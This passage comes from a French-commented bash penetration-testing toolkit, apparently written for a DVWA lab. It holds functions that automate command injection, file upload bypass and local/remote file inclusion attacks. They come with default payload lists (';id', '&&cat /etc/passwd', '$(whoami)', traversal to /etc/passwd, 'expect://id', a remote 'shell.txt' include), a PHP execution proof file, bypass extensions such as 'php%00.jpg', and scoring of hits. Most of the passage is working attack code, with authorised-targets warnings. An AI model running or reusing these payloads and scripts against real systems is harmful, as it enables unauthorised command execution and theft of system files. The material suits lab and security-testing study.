        COMBINED_PATH="${HOME}/ghost00ls/logs/dvwa_exploits/combined_paths.txt"
        awk -F',' 'NR>0 {print $6}' "$CLEAN" | sed 's/,$//' >> "$COMBINED_PATH" 2>/dev/null || true
        sort -u -o "$COMBINED_PATH" "$COMBINED_PATH" 2>/dev/null || true
        echo -e "${GREEN}‚Üí R√©sultats ajout√©s √† : $COMBINED_PATH${NC}"
    fi

    # human summary
    echo
    echo -e "${CYAN}üìä R√©sum√© XSS:${NC}"
    echo "‚Ä¢ Dossier : $OUT_DIR"
    echo "‚Ä¢ RAW log : $RAW_LOG"
    [ -f "$CLEAN" ] && echo "‚Ä¢ Clean hits : $CLEAN"
    [ -f "$SCORED" ] && echo "‚Ä¢ Scored (top first) : $SCORED"
    echo "‚Ä¢ CSV summary : $SUMMARY_CSV"
    echo
    if [ -s "$SCORED" ]; then
        echo -e "${YELLOW}‚Ä¢ Top hits (scored) :${NC}"
        head -n 10 "$SCORED"
    else
        echo "‚Ä¢ Aucun hit prioritaire trouv√©."
    fi
    echo

    # show saved special files
    echo -e "‚ñ∂ Fichiers r√©cup√©r√©s (si pr√©sents) :"
    [ -f "$OUT_DIR/robots.txt" ] && echo "  ‚Ä¢ robots.txt -> $OUT_DIR/robots.txt"
    [ -f "$OUT_DIR/phpinfo.html" ] && echo "  ‚Ä¢ phpinfo -> $OUT_DIR/phpinfo.html"
    [ -f "$OUT_DIR/git_HEAD" ] && echo "  ‚Ä¢ .git/HEAD -> $OUT_DIR/git_HEAD"
    [ -f "$OUT_DIR/favicon.ico" ] && echo "  ‚Ä¢ favicon.ico -> $OUT_DIR/favicon.ico"
    [ -f "$OUT_DIR/php.ini" ] && echo "  ‚Ä¢ php.ini -> $OUT_DIR/php.ini"
    echo

    echo -e "${GREEN}‚úÖ XSS scan termin√©.${NC}"
    echo -e "üîé Logs complets dans : $OUT_DIR"
    echo -e "‚úÖ R√©sum√© sauvegard√© : $SUMMARY_CSV"
    read -p "üëâ Entr√©e pour revenir..."
}



###################################################################################################

exploit_cmdinj() {
	clear; banner
    echo "=================================================="
    echo "üß™ [Command Injection - exploit_cmdinj]"
    echo "üìñ Objectif : d√©tecter injections de commandes (r√©flexion/ex√©cution)"
    echo "‚ö†Ô∏è  Ex√©cuter uniquement sur cibles autoris√©es"
    echo "=================================================="

    # ---------- user inputs ----------
    read -p "üåê H√¥te/IP cible (default: 192.168.20.101): " target_ip
    target_ip=${target_ip:-192.168.20.101}

    read -p "üîå Port (default: 8081): " target_port
    target_port=${target_port:-8081}

    read -p "üìÅ Path (default: /): " base_path
    base_path=${base_path:-/}

    read -p "üîó URL compl√®te √† tester (laisser vide pour base+?test=payload): " full_url

    read -p "‚öôÔ∏è Threads ffuf (default: 20): " threads
    threads=${threads:-20}

    read -p "‚ñ∂ Mode streaming (afficher hits en direct) ? [Y/n]: " stream_mode
    stream_mode=${stream_mode:-Y}
    echo

    # ---------- prepare paths ----------
    LOG_DIR="$HOME/ghost00ls/logs/dvwa_exploits/cmdinj/$(date '+%Y-%m-%d_%H-%M-%S')"
    mkdir -p "$LOG_DIR"
    PAYLOADS="$HOME/ghost00ls/wordlists/cmdinj_payloads.txt"
    CSV_OUT="$LOG_DIR/cmdinj_summary_$(date '+%Y-%m-%d_%H-%M-%S').csv"
    HTML_OUT="$LOG_DIR/cmdinj_report.html"
    FFUF_OUT="$LOG_DIR/ffuf_raw.csv"
    TMP_RESP="/tmp/ghost00ls_cmdinj_resp.$$"
    TMP_BASE="$LOG_DIR/baseline.tmp"
    TMP_PROOF="$LOG_DIR/cmdinj_proofs.txt"

    # ---------- ensure payloads exist (default list if absent) ----------
    if [[ ! -f "$PAYLOADS" ]]; then
        echo "‚ö†Ô∏è Wordlist manquante ‚Äî cr√©ation d'une wordlist par d√©faut -> $PAYLOADS"
        mkdir -p "$(dirname "$PAYLOADS")"
        cat > "$PAYLOADS" <<'EOF'
;id
&&id
|id
;whoami
|whoami
&&cat /etc/passwd
;uname -a
&&ls
|ls -la
&&echo Ghost00ls_Pwned
;ping -c 1 127.0.0.1
|sleep 1
||sleep 2
&&powershell whoami
|dir
&net user
&&type C:\Windows\win.ini
;echo GHOST_TEST
;id;uname -a
||whoami
`whoami`
$(whoami)
;cat /etc/hosts
;curl -I http://example.com
EOF
    fi

    # ---------- build base url ----------
    if [[ -n "$full_url" ]]; then
        base_url="$full_url"
    else
        # normalize base_path
        [[ "$base_path" != /* ]] && base_path="/$base_path"
        base_url="http://$target_ip:$target_port$base_path"
    fi

    echo "‚ñ∂ Cible : $base_url"
    echo "‚ñ∂ Payloads : $PAYLOADS"
    echo "‚ñ∂ Logs : $LOG_DIR"
    echo

    # ---------- baseline measurement (3 requests, safe parsing) ----------
    echo "‚ñ∂ Mesure baseline (3 requ√™tes)..."
    : > "$TMP_BASE"
    for i in 1 2 3; do
        # use curl to save only metrics
        curl -s -o /tmp/ghost00ls_base_resp.$$ -w "%{http_code} %{size_download} %{time_total}\n" --max-time 5 "$base_url" >> "$TMP_BASE" || echo "000 0 0" >> "$TMP_BASE"
    done

    # safe aggregate (avoid division by zero)
    baseline_status=$(awk '{sum+=$1;cnt++} END{ if(cnt>0) printf "%.0f", sum/cnt; else print 0 }' "$TMP_BASE")
    baseline_size=$(awk '{sum+=$2;cnt++} END{ if(cnt>0) printf "%.0f", sum/cnt; else print 0 }' "$TMP_BASE")
    baseline_time=$(awk '{sum+=$3;cnt++} END{ if(cnt>0) printf "%.6f", sum/cnt; else print 0 }' "$TMP_BASE")

    # ensure numeric fallback
    [[ ! "$baseline_status" =~ ^[0-9]+$ ]] && baseline_status=0
    awk 'BEGIN{if("'"$baseline_time"'"=="" || "'"$baseline_time"'"=="nan") print "0.000000"; else print "'"$baseline_time"'"}' >/dev/null 2>&1

    echo "Baseline -> status:$baseline_status size:$baseline_size time:$baseline_time"
    echo

    # ---------- output header ----------
    echo "status,size,time,payload,score,notes" > "$CSV_OUT"

    # ---------- helper: url-encode payload (jq preferred, python fallback) ----------
    urlencode() {
        local raw="$1"
        if command -v jq >/dev/null 2>&1; then
            printf '%s' "$raw" | jq -s -R -r @uri
        else
            # python fallback (should exist); final fallback: simple sed escape (best-effort)
            if command -v python3 >/dev/null 2>&1; then
                python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.stdin.read().strip()))" <<<"$raw"
            else
                # best-effort (not perfect)
                printf '%s' "$raw" | sed -e 's/ /%20/g' -e 's/`/%60/g' -e 's/"/%22/g' -e "s/'/%27/g" -e 's/|/%7C/g' -e 's/</%3C/g' -e 's/>/%3E/g' -e 's/&/%26/g' -e 's/(/%28/g' -e 's/)/%29/g'
            fi
        fi
    }

    # ---------- run curl tests (streaming mode if requested) ----------
    echo "‚ñ∂ Lancement tests payloads (curl mode, streaming live)..."
    while IFS= read -r payload || [[ -n "$payload" ]]; do
        [[ -z "$payload" ]] && continue
        enc=$(urlencode "$payload")
        url="${base_url}?test=${enc}"
        # request and capture body+meta (short timeout)
        result=$(curl -s -o "$TMP_RESP" -w "%{http_code} %{size_download} %{time_total}" --max-time 6 "$url")
        # parse safely
        status=$(awk '{print $1}' <<<"$result")
        size=$(awk '{print $2}' <<<"$result")
        time=$(awk '{print $3}' <<<"$result")

        # ensure numeric defaults
        [[ ! "$status" =~ ^[0-9]+$ ]] && status=0
        [[ ! "$size" =~ ^[0-9]+$ ]] && size=0
        # time may be float
        if ! awk 'BEGIN{exit !('"$time"'==0 || '"$time"'>0)}'; then
            time=0
        fi

        # scoring logic (type-safe numeric comparisons)
        score=0; notes=""
        if [[ "$status" -ne "$baseline_status" ]]; then
            score=$((score+25)); notes+="status-change;"
        fi

        # absolute size delta
        size_diff=$(( size - baseline_size ))
        abs_size_diff=${size_diff#-}
        if (( abs_size_diff > 120 )); then
            score=$((score+30)); notes+="size-deviation;"
        elif (( abs_size_diff > 20 )); then
            score=$((score+10)); notes+="size-small-deviation;"
        fi

        # time anomaly (floating point compare using awk)
        time_diff=$(awk -v a="$time" -v b="$baseline_time" 'BEGIN{d=a-b; if(d<0)d=-d; printf "%.6f", d}')
        if awk -v d="$time_diff" 'BEGIN{exit !(d>0.08)}'; then
            score=$((score+15)); notes+="time-anomaly;"
        fi

        # content proof check (quick, first 2KB)
        grep -iE "Ghost00ls_Pwned|uid=|root|administrator|<pre|login.php" "$TMP_RESP" >/dev/null 2>&1
        if [[ $? -eq 0 ]]; then
            score=$((score+40))
            notes+="proof-candidate;"
            # store proof snippet
            head -c 2048 "$TMP_RESP" | sed -n '1,40p' > "$LOG_DIR/proof_$(date +%s%N).txt"
            echo "$payload -> proof snippet saved" >> "$TMP_PROOF"
        fi

        # basic high-score threshold clamp
        if (( score > 100 )); then score=100; fi

        # write CSV line (escape payload double-quotes by doubling)
        safe_payload=$(printf '%s' "$payload" | sed 's/"/""/g')
        printf "%s,%s,%s,\"%s\",%s,%s\n" "$status" "$size" "$time" "$safe_payload" "$score" "$notes" >> "$CSV_OUT"

        # streaming output
        if [[ "$stream_mode" =~ ^[Yy]$ ]]; then
            if (( score >= 60 )); then
                echo -e "\e[32m[HIT ][score:$score] $status | ${size}B | ${time}s | $payload \e[0m"
            elif (( score >= 25 )); then
                echo -e "\e[33m[WARN][score:$score] $status | ${size}B | ${time}s | $payload \e[0m"
            else
                echo -e "\e[31m[MISS][score:$score] $status | ${size}B | ${time}s | $payload \e[0m"
            fi
        fi
    done < "$PAYLOADS"
    echo

    # ---------- run ffuf in background and merge results (if available) ----------
    if command -v ffuf >/dev/null 2>&1; then
        echo "‚ñ∂ ffuf d√©tect√© ‚Äî ex√©cution en parall√®le (auto mode)"
        # run ffuf quietly but produce CSV (suppress its STDOUT noise)
        ffuf -u "${base_url}?test=FUZZ" -w "$PAYLOADS" -t "$threads" -of csv -o "$FFUF_OUT" -mc all >/dev/null 2>&1 || true

        # merge ffuf CSV (if exists), safe parsing: ffuf csv format: Num,Status,Lines,Words,Size,Duration,Url,Input,ResultFile
        if [[ -s "$FFUF_OUT" ]]; then
            # for each ffuf result line (skip header), append to CSV with a moderate score if status/size/time differ
            awk -F, 'NR>1{
                # sanitize fields which may contain commas or quotes - ffuf CSV is simple on many builds
                status=$2; size=$6; dur=$7; input=$8;
                # strip surrounding quotes
                gsub(/^"/,"",input); gsub(/"$/,"",input);
                # compute a default ffuf score (30) and note
                printf("%s,%s,%s,\"%s\",%d,%s\n", status, size, dur, input, 30, "ffuf-auto;") 
            }' "$FFUF_OUT" >> "$CSV_OUT"
            echo "‚úÖ R√©sultats ffuf fusionn√©s dans le CSV final ($FFUF_OUT)"
        fi
    else
        echo "‚ö†Ô∏è ffuf non trouv√© ‚Äî mode curl uniquement."
    fi
    echo

    # ---------- additional proof-pass: re-check payloads with larger body capture if proof candidates exist ----------
    if [[ -s "$TMP_PROOF" ]]; then
        echo "‚ñ∂ V√©rification compl√©mentaire des preuves list√©es..."
        while IFS= read -r line; do
            echo "  $line"
        done < "$TMP_PROOF"
    fi

    # ---------- generate HTML report ----------
    echo "‚ñ∂ G√©n√©ration rapport HTML..."
    {
        cat <<'HTML_HEAD'
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Ghost00ls - Command Injection Report</title>
<style>
  body{font-family:Arial,Helvetica,sans-serif;background:#0b0b0b;color:#ddd;padding:20px}
  table{width:100%;border-collapse:collapse;margin-top:12px}
  th,td{padding:6px;border:1px solid #222}
  th{background:#111}
  .hit{background:#062; color:#001}
  .warn{background:#633; color:#ffe}
  .miss{background:#300; color:#fdd}
  pre{background:#111;padding:8px;color:#afa;overflow:auto}
</style>
</head>
<body>
<h1>Ghost00ls ‚Äî Command Injection Report</h1>
<p>Target: <b><!--TARGET--></b></p>
<table>
<tr><th>Status</th><th>Size</th><th>Time</th><th>Payload</th><th>Score</th><th>Notes</th></tr>
HTML_HEAD
    } > "$HTML_OUT"

    # inject target into HTML
    sed -i "s|<!--TARGET-->|$base_url|g" "$HTML_OUT"

    # append rows from CSV
    tail -n +2 "$CSV_OUT" | while IFS=',' read -r status size time payload score notes; do
        # payload may be quoted and contain commas; reconstruct payload by joining fields between 4th and before score
        # simpler approach: read raw line
        raw_line=$(grep -F -- "$status,$size,$time" "$CSV_OUT" | head -n1)
        # fallback formatting: use the original CSV parsing by awk for safety
        awk -F, -v s="$status" -v sz="$size" -v t="$time" -v sc="$score" -v n="$notes" 'BEGIN{
            # nothing
        }{
            # print safe row
        }' >/dev/null 2>&1
        # determine class
        cls="miss"
        if [[ "$score" =~ ^[0-9]+$ ]] && (( score >= 60 )); then cls="hit"; fi
        if [[ "$score" =~ ^[0-9]+$ ]] && (( score >= 25 && score < 60 )); then cls="warn"; fi

        # payload may include quotes; to display nicely, remove surrounding quotes if present
        display_payload="$payload"
        display_payload="${display_payload%\"}"
        display_payload="${display_payload#\"}"

        # append row to HTML
        printf "<tr class=\"%s\"><td>%s</td><td>%s</td><td>%s</td><td><code>%s</code></td><td>%s</td><td>%s</td></tr>\n" \
            "$cls" "$status" "$size" "$time" "$(html_escape "$display_payload")" "$score" "$notes" >> "$HTML_OUT" 2>/dev/null || \
        printf "<tr class=\"%s\"><td>%s</td><td>%s</td><td>%s</td><td>%s</td><td>%s</td><td>%s</td></tr>\n" \
            "$cls" "$status" "$size" "$time" "$display_payload" "$score" "$notes" >> "$HTML_OUT"
    done

    # append proofs if any
    if [[ -s "$TMP_PROOF" ]]; then
        echo "</table><h2>Confirmed proofs / snippets</h2><pre>" >> "$HTML_OUT"
        sed -n '1,200p' "$TMP_PROOF" >> "$HTML_OUT"
        echo "</pre>" >> "$HTML_OUT"
    else
        echo "</table><p>No confirmed proofs found.</p>" >> "$HTML_OUT"
    fi

    echo "</body></html>" >> "$HTML_OUT"

    # ---------- summary ----------
    echo
    echo "üìä R√©sum√© Command Injection :"
    echo "‚Ä¢ Dossier : $LOG_DIR"
    echo "‚Ä¢ R√©sum√© CSV : $CSV_OUT"
    echo "‚Ä¢ Rapport HTML : $HTML_OUT"
    [[ -f "$FFUF_OUT" ]] && echo "‚Ä¢ ffuf CSV : $FFUF_OUT"
    echo "‚úÖ Scan termin√©."
    echo
    read -p "üëâ Entr√©e pour revenir..."
}

# helper: minimal html escape function for payload display (pure bash)
html_escape() {
    local s="$1"
    s="${s//&/&amp;}"
    s="${s//</&lt;}"
    s="${s//>/&gt;}"
    s="${s//\"/&quot;}"
    s="${s//\'/&#39;}"
    printf '%s' "$s"
}


###################################################################################################

exploit_upload() {
    clear; banner

    echo -e "=================================================="
    echo -e "üß™ [File Upload - exploit_upload v2.1 (Ultimate+ffuf+ProofOnly)]"
    echo -e "üìñ Objectif : tester les vuln√©rabilit√©s d‚Äôupload (bypass & ex√©cution)"
    echo -e "‚ö†Ô∏è  √Ä utiliser uniquement sur des cibles autoris√©es"
    echo -e "=================================================="

    # === Input ===
    local TARGET_IP TARGET_PORT TARGET_PATH WORDLIST THREADS STREAMING COOKIE FFUF_MODE
    read -p "üåê H√¥te/IP cible (default: 192.168.20.101): " TARGET_IP; TARGET_IP=${TARGET_IP:-192.168.20.101}
    read -p "üîå Port (default: 8081): " TARGET_PORT; TARGET_PORT=${TARGET_PORT:-8081}
    read -p "üìÅ Path du formulaire (default: /vulnerabilities/upload/): " TARGET_PATH; TARGET_PATH=${TARGET_PATH:-/vulnerabilities/upload/}
    read -p "üìÇ Wordlist extensions (default: ~/ghost00ls/wordlists/upload_exts.txt): " WORDLIST; WORDLIST=${WORDLIST:-"$HOME/ghost00ls/wordlists/upload_exts.txt"}
    read -p "‚öôÔ∏è Threads ffuf (default: 20): " THREADS; THREADS=${THREADS:-20}
    read -p "‚ñ∂ Mode streaming (afficher hits en direct) ? [Y/n]: " STREAMING; STREAMING=${STREAMING:-Y}
    read -p "üç™ Cookie header (ex: 'PHPSESSID=xxx' - laisser vide pour none): " COOKIE; COOKIE=${COOKIE:-}
    FFUF_MODE="auto"

    # === Setup paths ===
    local TIMESTAMP LOGDIR WORKDIR CSV REPORT_HTML JSON_OUT FFUF_CSV
    TIMESTAMP=$(date +%F_%H-%M-%S)
    LOGDIR="$HOME/ghost00ls/logs/dvwa_exploits/upload/$TIMESTAMP"
    mkdir -p "$LOGDIR"
    WORKDIR=$(mktemp -d -t ghost_upload_XXXX)
    CSV="$LOGDIR/upload_summary_${TIMESTAMP}.csv"
    FFUF_CSV="$LOGDIR/ffuf_raw_${TIMESTAMP}.csv"
    REPORT_HTML="$LOGDIR/upload_report_${TIMESTAMP}.html"
    JSON_OUT="$LOGDIR/upload_results_${TIMESTAMP}.json"
    local TARGET_URL="http://${TARGET_IP}:${TARGET_PORT}${TARGET_PATH}"

    echo -e "\nüåê Cible : $TARGET_URL"
    echo -e "üìÇ Wordlist : $WORDLIST"
    echo -e "üìÅ Logs : $LOGDIR"
    echo -e "‚ñ∂ Working dir : $WORKDIR\n"

    # === Default wordlist ===
    if [ ! -f "$WORDLIST" ]; then
        mkdir -p "$(dirname "$WORDLIST")"
        cat >"$WORDLIST"<<'WL'
php
phtml
php3
php4
php5
php6
php7
php8
php%00.jpg
jpg.php
php.jpg
php.png
png.php
php.gif
gif.php
phar
pht
phtm
shtml
jsp
jspx
cgi
WL
    fi

    # === Proof payload ===
    local MARKER="GHOST_UPLOAD_OK_$(date +%s%N | sha1sum | awk '{print $1}')"
    local PAYLOAD="$WORKDIR/proof.php"
    echo "<?php echo '$MARKER'; ?>" >"$PAYLOAD"

    # === Endpoint autodetect ===
    echo "‚ñ∂ Recherche endpoint d‚Äôupload valide..."
    local TRY=("/vulnerabilities/upload/" "/upload.php" "/file.php" "/image_upload.php" "$TARGET_PATH")
    local FOUND=""
    for ep in "${TRY[@]}"; do
        local code
        code=$(curl -s -o /dev/null -w "%{http_code}" "http://${TARGET_IP}:${TARGET_PORT}${ep}" || true)
        [ "$code" != "000" ] && FOUND="http://${TARGET_IP}:${TARGET_PORT}${ep}" && break
    done
    TARGET_URL="${FOUND:-$TARGET_URL}"
    echo "‚úÖ Endpoint utilis√© : $TARGET_URL"

    # === Baseline ===
    echo -e "\n‚ñ∂ Mesure baseline (3 requ√™tes)..."
    local BASE_STATUS BASE_SIZE_SUM BASE_TIME_SUM
    BASE_STATUS="200"; BASE_SIZE_SUM=0; BASE_TIME_SUM=0.0
    for i in 1 2 3; do
        local res
        res=$(curl -s -L -w "%{http_code} %{size_download} %{time_total}" -o "$WORKDIR/base_$i.html" \
              ${COOKIE:+-H "Cookie: $COOKIE"} "$TARGET_URL" || true)
        local st sz ti
        st=$(echo "$res"|awk '{print $1}') ; sz=$(echo "$res"|awk '{print $2}') ; ti=$(echo "$res"|awk '{print $3}')
        BASE_STATUS="$st"
        BASE_SIZE_SUM=$((BASE_SIZE_SUM + sz))
        BASE_TIME_SUM=$(awk -v a="$BASE_TIME_SUM" -v b="$ti" 'BEGIN{printf "%.6f",a+b}')
    done
    local BASE_SIZE_AVG=$((BASE_SIZE_SUM/3))
    local BASE_TIME_AVG=$(awk -v t="$BASE_TIME_SUM" 'BEGIN{printf "%.6f",t/3}')
    echo "Baseline -> status:$BASE_STATUS size:$BASE_SIZE_AVG time:$BASE_TIME_AVG"

    echo "ext,status,size,time,score,proof,url" >"$CSV"

    # === Launch ffuf ===
    local FFUF_BIN; FFUF_BIN=$(command -v ffuf || true)
    local FFUF_PID=""
    if [ -n "$FFUF_BIN" ]; then
        echo -e "\n‚ñ∂ ffuf trouv√© ‚Äî ex√©cution en arri√®re-plan ($THREADS threads)"
        ${FFUF_BIN} -u "${TARGET_URL%/}/?file=FUZZ" -w "$WORDLIST:FUZZ" \
            -t "$THREADS" -mc all -of csv -o "$FFUF_CSV" ${COOKIE:+-H "Cookie: $COOKIE"} \
            >"$LOGDIR/ffuf_stdout.log" 2>&1 & FFUF_PID=$!
    else
        echo -e "‚ö†Ô∏è  ffuf non trouv√©, mode curl-only"
    fi

    # === Curl tests ===
    echo -e "\n‚ñ∂ Lancement tests payloads (curl mode, streaming live)..."
    local TOTAL=0 UPLOAD_OK=0 EXEC_OK=0 MISS=0
    while read -r EXT; do
        EXT=$(echo "$EXT"|tr -d '\r')
        [ -z "$EXT" ] && continue
        TOTAL=$((TOTAL+1))
        local F="$WORKDIR/test.$EXT"; cp "$PAYLOAD" "$F"
        local out; out=$(curl -s -L -w "%{http_code} %{size_download} %{time_total}" \
             -o "$WORKDIR/out_$EXT.html" ${COOKIE:+-H "Cookie: $COOKIE"} \
             -F "uploaded=@$F;filename=test.$EXT" "$TARGET_URL" || true)
        local st sz ti; st=$(echo "$out"|awk '{print $1}') ; sz=$(echo "$out"|awk '{print $2}') ; ti=$(echo "$out"|awk '{print $3}')
        local sc=0 pr=""
        [ "$st" != "$BASE_STATUS" ] && sc=$((sc+25))
        [ "$sz" -ne "$BASE_SIZE_AVG" ] && sc=$((sc+15))
        awk -v t="$ti" -v b="$BASE_TIME_AVG" 'BEGIN{if(b>0&&t>b*1.5) exit 0; exit 1}' && sc=$((sc+10))
        grep -q "$MARKER" "$WORKDIR/out_$EXT.html" && { pr="marker-in-response"; sc=$((sc+50)); EXEC_OK=$((EXEC_OK+1)); }
        [ -z "$pr" ] && [[ "$st" =~ ^2|^3 ]] && UPLOAD_OK=$((UPLOAD_OK+1))
        [ "$sc" -lt 20 ] && MISS=$((MISS+1))
        [[ "${STREAMING^^}" = "Y" ]] && echo "[$st] .$EXT ‚Üí score:$sc"
        echo "$EXT,$st,$sz,$ti,$sc,$pr,$TARGET_URL" >>"$CSV"
    done <"$WORDLIST"

    # === Wait for ffuf and merge ===
    [ -n "$FFUF_PID" ] && { echo "‚ñ∂ Attente ffuf (pid:$FFUF_PID)..."; wait "$FFUF_PID" || true; }
    [ -f "$FFUF_CSV" ] && awk -F, 'NR>1{gsub(/"/,"");print $8","$2","$4","$6",40,ffuf,"$9}' ffuf="$TARGET_URL" "$FFUF_CSV" >>"$CSV" || true

    # === Proof-only recheck ===
    echo -e "\n‚ñ∂ Proof-only check sur chemins /uploads/ ..."
    local found_proofs=0
    grep -v '^ext' "$CSV" | cut -d',' -f1 | sort -u | while read -r EXT; do
        for path in "hackable/uploads" "uploads" "files" "../uploads" "../../uploads"; do
            local u="${TARGET_URL%/}/$path/test.$EXT"
            local body; body=$(curl -s -L -m 5 "$u" || true)
            if echo "$body" | grep -q "$MARKER"; then
                echo "‚úÖ Proof trouv√© : $u"
                echo "$EXT,200,0,0,90,executed:$u,$TARGET_URL" >>"$CSV"
                ((found_proofs++))
            fi
        done
    done
    [ "$found_proofs" -gt 0 ] && echo "‚úÖ $found_proofs preuves d‚Äôex√©cution trouv√©es" || echo "‚ùå Aucune preuve post-scan"

    # === G√©n√©ration JSON + HTML ===
    echo "‚ñ∂ G√©n√©ration rapport HTML + JSON..."
    jq -Rsn '
        [inputs | split("\n") | .[1:] | map(select(length>0)) |
         map(split(",") | {
             ext: .[0], status: .[1], size: .[2],
             time: .[3], score: .[4], proof: .[5], url: .[6]
         })] | flatten' "$CSV" >"$JSON_OUT" 2>/dev/null || true

    # mini HTML
    {
        echo "<!doctype html><html><head><meta charset='utf-8'><style>
        body{font-family:monospace;background:#111;color:#ddd}th,td{padding:4px;border:1px solid #333;}th{background:#222}
        </style></head><body><h2>Ghost00ls - Upload Report</h2>
        <p>Cible: $TARGET_URL<br>Date: $(date)</p><table><tr><th>Ext</th><th>Status</th><th>Score</th><th>Proof</th></tr>"
        tail -n +2 "$CSV"|while IFS=, read -r e s z t sc pr u;do echo "<tr><td>$e</td><td>$s</td><td>$sc</td><td>$pr</td></tr>";done
        echo "</table></body></html>"
    } >"$REPORT_HTML"

    echo -e "\nüìä R√©sum√© File Upload :"
    echo "‚Ä¢ Dossier : $LOGDIR"
    echo "‚Ä¢ Rapport HTML : $REPORT_HTML"
    echo "‚Ä¢ JSON : $JSON_OUT"
    echo "‚Ä¢ R√©sum√© CSV : $CSV"
    echo "‚úÖ Scan termin√©."
    read -p "üëâ Entr√©e pour revenir..."
}


###################################################################################################

exploit_lfi() {
    clear
    banner "LFI"
    echo "=================================================="
    echo "üß™ [File Inclusion - exploit_lfi]"
    echo "üìñ Objectif : tester les vuln√©rabilit√©s LFI & RFI (Local / Remote File Inclusion)"
    echo "‚ö†Ô∏è  √Ä utiliser uniquement sur des cibles autoris√©es"
    echo "=================================================="

    local TARGET_IP TARGET_PORT TARGET_PATH TARGET_URL WORDLIST THREADS STREAMING COOKIE ENABLE_RFI
    local WORKDIR LOGDIR CSV REPORT_HTML PROOFDIR MAP MAX_TIME

    read -p "üåê H√¥te/IP cible (default: 192.168.20.101): " TARGET_IP; TARGET_IP=${TARGET_IP:-192.168.20.101}
    read -p "üîå Port (default: 8081): " TARGET_PORT; TARGET_PORT=${TARGET_PORT:-8081}
    read -p "üìÅ Path vuln√©rable (ex: /vulnerabilities/fi/?file=) (default: /vulnerabilities/fi/?file=): " TARGET_PATH; TARGET_PATH=${TARGET_PATH:-/vulnerabilities/fi/?file=}
    read -p "üìÇ Wordlist payloads (default: ~/ghost00ls/wordlists/lfi_payloads.txt): " WORDLIST; WORDLIST=${WORDLIST:-$HOME/ghost00ls/wordlists/lfi_payloads.txt}
    read -p "‚öôÔ∏è Threads ffuf (optionnel, default: 20): " THREADS; THREADS=${THREADS:-20}
    read -p "‚ñ∂ Mode streaming (afficher r√©sultats en direct) ? [Y/n]: " STREAMING; STREAMING=${STREAMING:-Y}
    read -p "üç™ Cookie PHPSESSID (laisser vide pour anonyme): " COOKIE
    read -p "üåê Tester les inclusions distantes (RFI) ? [y/N]: " ENABLE_RFI; ENABLE_RFI=${ENABLE_RFI:-N}

    MAX_TIME=10
    TARGET_URL="http://${TARGET_IP}:${TARGET_PORT}${TARGET_PATH}"
    WORKDIR="$(mktemp -d)"
    LOGDIR="$HOME/ghost00ls/logs/dvwa_exploits/lfi/$(date +%F_%H-%M-%S)"
    PROOFDIR="$LOGDIR/proof"
    mkdir -p "$LOGDIR" "$PROOFDIR"
    CSV="$LOGDIR/lfi_summary_$(date +%F_%H-%M-%S).csv"
    REPORT_HTML="$LOGDIR/lfi_report.html"
    MAP="$LOGDIR/map_payload_to_file.txt"

    echo
    echo "üåê Cible : $TARGET_URL"
    echo "üìÇ Wordlist : $WORDLIST"
    echo "üìÅ Logs : $LOGDIR"
    echo "‚è±Ô∏è  Timeout par requ√™te : ${MAX_TIME}s"
    echo

    if [ ! -f "$WORDLIST" ]; then
        echo "‚ö†Ô∏è  Wordlist introuvable. Cr√©ation de $WORDLIST ..."
        mkdir -p "$(dirname "$WORDLIST")"
        cat > "$WORDLIST" <<'WL'
../../../../../../etc/passwd
../../../../../../etc/hosts
../../../../proc/self/environ
php://filter/convert.base64-encode/resource=index.php
expect://id
WL
    fi

    if [[ "$ENABLE_RFI" =~ ^[Yy]$ ]]; then
        echo "http://example.com/shell.txt" >> "$WORDLIST"
    fi

    echo "‚ñ∂ Mesure baseline (3 requ√™tes)..."
    local BASE_PROBE="${TARGET_URL%?file=}index.php"
    local BASE_STATUS="" BASE_SIZE_SUM=0 BASE_TIME_SUM=0
    for i in 1 2 3; do
        local OUT=$(curl -s -L -k --max-time "$MAX_TIME" -A "Ghost00ls-LFI" \
                    -w "%{http_code}|%{size_download}|%{time_total}" -o /dev/null "$BASE_PROBE")
        BASE_STATUS=$(echo "$OUT" | cut -d'|' -f1)
        BASE_SIZE_SUM=$((BASE_SIZE_SUM + $(echo "$OUT" | cut -d'|' -f2)))
        BASE_TIME_SUM=$(awk -v a="$BASE_TIME_SUM" -v b="$(echo "$OUT" | cut -d'|' -f3)" 'BEGIN{printf "%.6f", a+b}')
    done
    local BASE_SIZE_AVG=$((BASE_SIZE_SUM / 3))
    local BASE_TIME_AVG=$(awk -v t="$BASE_TIME_SUM" 'BEGIN{printf "%.6f", t/3}')
    echo "Baseline -> status:$BASE_STATUS size:$BASE_SIZE_AVG time:$BASE_TIME_AVG"
    echo

    echo "‚ñ∂ Lancement tests payloads (curl mode, streaming live)..."
    echo "timestamp,payload,status,size,time,score,proof,outfile" > "$CSV"

    # === Fonction utilitaire : hash safe ===
    _safe_filename() {
        echo "$1" | tr -cd '[:alnum:]_.-' | cut -c1-80
    }

    while IFS= read -r PAYLOAD; do
        PAYLOAD=$(echo "$PAYLOAD" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
        [ -z "$PAYLOAD" ] && continue
        [[ "$PAYLOAD" =~ ^# ]] && continue

        local SAFE=$(_safe_filename "$PAYLOAD")
        local OUTFILE="$WORKDIR/out_${SAFE:-hash}.html"
        echo "$SAFE => $PAYLOAD" >> "$MAP"

        local URL="${TARGET_URL}${PAYLOAD}"
        local OUT
        if [ -n "$COOKIE" ]; then
            OUT=$(curl -s -L -k --max-time "$MAX_TIME" -H "Cookie: $COOKIE" \
                  -w "%{http_code}|%{size_download}|%{time_total}" -o "$OUTFILE" "$URL")
        else
            OUT=$(curl -s -L -k --max-time "$MAX_TIME" \
                  -w "%{http_code}|%{size_download}|%{time_total}" -o "$OUTFILE" "$URL")
        fi

        local STATUS=$(echo "$OUT" | cut -d'|' -f1)
        local SIZE=$(echo "$OUT" | cut -d'|' -f2)
        local TIME_REQ=$(echo "$OUT" | cut -d'|' -f3)
        local SCORE=0 PROOF=""

        [ "$STATUS" != "$BASE_STATUS" ] && SCORE=$((SCORE+20))
        [ "$SIZE" -gt "$BASE_SIZE_AVG" ] && SCORE=$((SCORE+10))
        awk -v t="$TIME_REQ" -v b="$BASE_TIME_AVG" 'BEGIN{exit !(t > b*1.5)}' && SCORE=$((SCORE+10))

        if [ -s "$OUTFILE" ]; then
            if grep -q "root:.*:0:0:" "$OUTFILE"; then
                PROOF="/etc/passwd"; SCORE=$((SCORE+100))
                cp "$OUTFILE" "$PROOFDIR/${SAFE}_passwd.html"
